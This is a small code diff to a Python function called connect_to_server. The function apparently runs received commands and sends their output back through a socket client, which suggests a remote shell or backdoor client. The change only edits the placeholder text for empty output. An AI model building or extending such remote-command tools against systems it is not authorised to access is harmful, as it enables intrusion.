@@ -26,7 +26,7 @@ def connect_to_server():
                 
                 response = output.stdout + output.stderr
                 if not response:
-                    response = "[ Executed with no output ]"
+                    response = " Executed with no output"
                     
                 client.send(response.encode('utf-8'))
                 
